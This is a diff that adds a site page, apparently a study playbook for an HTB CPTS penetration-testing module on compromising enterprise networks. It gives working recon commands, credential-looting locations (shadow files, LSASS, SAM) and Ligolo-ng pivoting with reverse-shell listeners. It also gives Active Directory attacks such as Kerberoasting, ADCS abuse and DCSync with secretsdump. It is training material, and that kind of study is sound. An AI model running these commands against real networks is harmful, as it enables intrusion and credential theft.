@@ -1,0 +1,165 @@
+---
+title: "Attacking Enterprise Networks"
+sidebarTitle: "Enterprise networks playbook"
+description: "End-to-end multi-host enterprise network penetration testing playbook from external perimeter recon through multi-hop Ligolo pivoting to AD forest compromise."
+keywords: ["attacking enterprise networks", "multi-host", "capstone", "cpts exam playbook", "lateral movement", "ligolo double pivot", "domain compromise"]
+boost: 2
+---
+
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
+
+{/* Generated from Study Planning/Methodology/Attacking Enterprise Networks.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+**HTB CPTS Module #28 (Attacking Enterprise Networks)** is the capstone module of the CPTS path and mirrors the structure of the 10-day CPTS certification exam: an external perimeter host leads into a multi-subnet, multi-host enterprise Active Directory environment requiring chained web/service enumeration, privilege escalation, credential harvesting, multi-hop pivoting, and Active Directory domain/forest compromise.
+
+<Tip>
+**Track Every Host, Credential & Pivot in Real Time**
+
+Open [My Workspace (`/lab-guide`)](/lab-guide) alongside this playbook to maintain your live **Multi-Host Inventory**, **Credential & Loot Matrix**, **Ligolo-ng Pivot Topology**, and **6-Field Report Findings** as you progress through each subnet.
+</Tip>
+
+---
+
+## Phase 1: External Perimeter & DMZ Foothold
+
+1. **Full TCP & Top UDP Port Discovery on Entry Host(s):**
+
+```bash
+mkdir -p evidence/nmap
+nmap -sT -p- --min-rate 3000 --open -oA evidence/nmap/dmz-all-tcp TARGET_IP
+nmap -sT -sV -sC -p OPEN_PORTS -oA evidence/nmap/dmz-services TARGET_IP
+sudo nmap -sU --top-ports 20 -sV -oA evidence/nmap/dmz-udp TARGET_IP
+```
+
+2. **Hostname, VHost & DNS Discovery:**
+   - Inspect HTTP redirects, TLS certificate CN/SANs, and DNS SOA/AXFR records (`dig @TARGET_IP DOMAIN_FQDN AXFR`).
+   - Add every discovered domain and virtual host to `/etc/hosts` and run VHost discovery with [`ffuf`](/web/ffuf-guide):
+
+```bash
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
+  -u http://TARGET_IP/ -H 'Host: FUZZ.DOMAIN_FQDN' -mc all -fs BASELINE_SIZE
+```
+
+3. **Web & Common Application Exploitation:**
+   - Fingerprint all discovered web apps and management portals ([Attacking Common Applications](/web/common-applications)).
+   - Test for [File Upload](/web/file-upload), [LFI / RFI](/web/lfi-rfi), [SQL Injection](/web/sqli), [Command Injection](/web/cmdi), [XXE](/web/xxe), and [IDOR](/web/idor).
+
+---
+
+## Phase 2: Host Privilege Escalation & Post-Exploitation Looting
+
+Never treat `root` or `NT AUTHORITY\SYSTEM` as the end of a host—in an enterprise network, privilege escalation is how you unlock the **credentials and network routes** needed for the next host.
+
+### Post-Compromise Loot Sweep (Run on Every Compromised Host)
+
+| Target OS | High-Value Loot Locations to Check Before Moving On |
+| --- | --- |
+| **Linux Host** | `/etc/passwd`, `/etc/shadow`, `/home/*/.ssh/`, `/home/*/.bash_history`, `/var/www/` config files (`wp-config.php`, `.env`, `settings.php`), `/opt/`, `/var/backups/`, `/etc/crontab`, running process env vars (`cat /proc/*/environ`), `ip a`, `ip route`, `/etc/hosts`, `/etc/resolv.conf` |
+| **Windows Host** | SAM / SYSTEM / LSA secrets (`secretsdump` / `mimikatz`), LSASS (`sekurlsa::logonpasswords`), DPAPI / Vault (`cmdkey /list`), PowerShell history (`ConsoleHost_history.txt`), `C:\inetpub\wwwroot\web.config`, `Unattend.xml`, Scheduled Tasks, Services running as domain accounts, `ipconfig /all`, `route print`, `arp -a` |
+
+- Record every recovered username, password, NT hash, SSH key, and Kerberos ticket in the **Credential & Loot Matrix** and test each new credential across all reachable services (`SMB`, `WinRM`, `SSH`, `RDP`, `MSSQL`, `LDAP`).
+
+---
+
+## Phase 3: Multi-Hop Pivoting & Internal Subnet Discovery
+
+1. **Identify Dual-Homed Interfaces & Internal Subnets:**
+   - Compare `ip -br a` / `ip route` (Linux) or `ipconfig /all` / `route print` (Windows) on the newly compromised host to spot new internal CIDRs (e.g., `172.16.5.0/24`, `172.16.109.0/24`).
+2. **Establish Routed Access with Ligolo-ng:**
+
+```bash
+# On Kali: start proxy and check certificate fingerprint
+sudo ./proxy -selfcert
+# Inside ligolo-ng:
+certificate_fingerprint
+interface_create --name ligolo1
+
+# On Pivot Host: connect agent back to Kali
+./agent -connect LHOST:11601 -accept-fingerprint FINGERPRINT
+
+# Inside ligolo-ng: select session, start tunnel, and route internal subnet
+session
+tunnel_start --tun ligolo1
+interface_add_route --name ligolo1 --route INTERNAL_CIDR
+```
+
+3. **Reverse Listeners for Double/Triple Pivots (`listener_add`):**
+   - When an internal host (`Subnet 2`) cannot reach Kali directly, bind a Ligolo listener on the first pivot (`Pivot 1`):
+
+```text
+# Inside ligolo-ng session on Pivot 1:
+listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
+listener_add --addr 0.0.0.0:4443 --to 127.0.0.1:4443 --tcp
+listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:8000 --tcp
+```
+
+   - Now hosts in `Subnet 2` can connect their Ligolo agent, reverse shell (`4443`), and HTTP file downloads (`8000`) directly to `PIVOT1_INTERNAL_IP`!
+4. **Fast Internal Host & Port Discovery Through the Tunnel:**
+
+```bash
+# Fast TCP port triage across an internal /24 through Ligolo
+nmap -sT -Pn -n --top-ports 25 -T4 --open -oA evidence/nmap/internal-sweep INTERNAL_CIDR
+nxc smb INTERNAL_CIDR
+```
+
+---
+
+## Phase 4: Internal Active Directory Enumeration & Lateral Movement
+
+Once an internal Domain Controller (`88`, `389`, `445`, `636`, `3268`) and member servers are reachable:
+
+1. **Configure DNS / `/etc/hosts` & Time Alignment:**
+   - Map `DC_IP` to `DOMAIN_FQDN` and `DC_FQDN` in `/etc/hosts` and verify clock skew (`ntpdate` / `faketime` if needed for Kerberos).
+2. **Unauthenticated & Low-Privilege AD Checks:**
+   - Null/guest SMB shares & RID cycling (`nxc smb DC_IP -u '' -p '' --shares`, `nxc smb DC_IP -u 'guest' -p '' --rid-brute`).
+   - AS-REP Roasting (`GetNPUsers.py DOMAIN_FQDN/ -dc-ip DC_IP -usersfile users.txt -format hashcat`).
+3. **Authenticated AD Enumeration & BloodHound Collection:**
+
+```bash
+# Validate credentials & check shares/users/policy
+nxc smb INTERNAL_CIDR -d DOMAIN_FQDN -u USER -p 'PASSWORD'
+nxc smb INTERNAL_CIDR -d DOMAIN_FQDN -u USER -p 'PASSWORD' --shares
+
+# Collect BloodHound graph from Kali
+bloodhound-ce-python -d DOMAIN_FQDN -u USER -p 'PASSWORD' -ns DC_IP -c All --zip --dns-tcp
+```
+
+4. **Execute High-Probability AD Escalation Paths:**
+   - **Kerberoasting:** `impacket-GetUserSPNs 'DOMAIN_FQDN/USER:PASSWORD' -dc-ip DC_IP -request -outputfile kerberoast.hash` → crack with `hashcat -m 13100`.
+   - **ACL / Object Control Abuse:** Check `First Degree Object Control`, `Transitive Object Control`, and `bloodyAD --host DC_IP -d DOMAIN_FQDN -u USER -p 'PASSWORD' get writable` (`ForceChangePassword`, `GenericAll`, `WriteDACL`, `AddMember`, `AddKeyCredentialLink` / Shadow Credentials, gMSA password read).
+   - **AD Certificate Services (ADCS):** `certipy find -u 'USER@DOMAIN_FQDN' -p 'PASSWORD' -dc-ip DC_IP -vulnerable -stdout` (ESC1, ESC4, ESC8).
+   - **Kerberos Delegation:** Unconstrained delegation (`Monitor/Coerce` with PrinterBug/PetitPotam + Rubeus/krbrelayx), Constrained delegation (`getST.py -spn ... -impersonate Administrator`), and Resource-Based Constrained Delegation (RBCD via `rbcd.py`).
+   - **GPO & File Share Abuse:** Check `spider_plus` on SMB shares, SYSVOL scripts, and editable GPOs.
+
+---
+
+## Phase 5: Domain Compromise & Cross-Domain / Forest Trust Abuse
+
+1. **DCSync & Domain Controller Compromise:**
+   - Once you compromise an account with replication rights (`Domain Admins`, `Enterprise Admins`, or explicit `DS-Replication-Get-Changes-All`):
+
+```bash
+impacket-secretsdump 'DOMAIN_FQDN/USER:PASSWORD@DC_FQDN' -just-dc-user Administrator
+```
+
+2. **Enumerate Domain & Forest Trusts:**
+   - Check `Get-ADTrust -Filter *` or `nxc ldap DC_IP -d DOMAIN_FQDN -u USER -p 'PASSWORD' -M enum_trusts`.
+   - **Child → Parent Trust (`ExtraSids` / Golden Ticket / `raiseChild.py`):** Use the child domain's `krbtgt` hash or `Enterprise Admins` SID (`S-1-5-21-<PARENT_DOMAIN>-519`) to escalate from Child DA to Parent DA.
+   - **Cross-Forest Trust:** Check for shared passwords across forests, Foreign Security Principals / cross-forest group memberships, Kerberoasting across trusts, and unconstrained delegation across forest boundaries.
+
+---
+
+## Enterprise Engagement Verification Checklist
+
+- [ ] Every discovered subnet (`DMZ`, `Internal 1`, `Internal 2`, `Management/AD`) has a recorded port scan and host inventory.
+- [ ] Every compromised host has been checked for both `user.txt` and `root.txt` / `Administrator` flag **and** swept for post-exploitation credentials.
+- [ ] Every recovered credential has been tested against all reachable hosts in the Credential Matrix.
+- [ ] Every step in the compromise chain has reproduction commands and screenshot evidence ready for the [Reporting Methodology](/methodology/reporting).
+
+Related guides: [Systems & Pivoting Methodology](/pivoting/methodology) · [Active Directory Methodology](/active-directory/methodology) · [Worked AD Attack Path (`nexura.htb`)](/cheatsheets/ad-attack-path-worked-example) · [Reporting Methodology](/methodology/reporting)
